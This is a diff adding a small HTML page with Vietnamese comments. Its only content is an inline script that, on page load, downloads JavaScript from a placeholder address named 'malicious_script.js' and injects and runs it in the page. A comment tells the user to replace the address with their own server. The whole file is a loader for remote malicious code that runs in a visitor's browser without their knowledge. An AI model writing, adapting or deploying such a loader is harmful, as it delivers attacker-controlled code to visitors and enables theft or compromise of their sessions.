@@ -1,0 +1,28 @@
+<html>
+<head>
+<script>
+var scriptUrl = "http://your-server.com/malicious_script.js"; // Thay thế bằng URL thực tế của bạn
+
+function loadAndExecuteScript(url) {
+    var xhr = new XMLHttpRequest();
+    xhr.open("GET", url, false); // false để thực hiện đồng bộ (synchronous)
+    xhr.send();
+
+    if (xhr.status === 200) {
+        var script = document.createElement("script");
+        script.text = xhr.responseText;
+        document.body.appendChild(script);
+    } else {
+        alert("Không thể tải script từ: " + url + "\nTrạng thái: " + xhr.status);
+    }
+}
+
+window.onload = function() {
+    loadAndExecuteScript(scriptUrl);
+};
+</script>
+</head>
+<body>
+    <!-- Nội dung này có thể trống hoặc có thể chứa các thông báo cho người dùng -->
+</body>
+</html>
